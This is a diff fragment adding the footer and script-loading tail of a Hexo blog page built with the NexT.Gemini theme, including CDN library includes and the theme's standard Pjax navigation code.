+        <a href="https://github.com/geeeez/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;geeeez&#x2F;" rel="noopener" target="_blank"><i class="fa fa-fw fa-fab fa-github"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-fas fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Geez</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">118k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:47</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+  
+
+    </div>
+</body>
+</html>
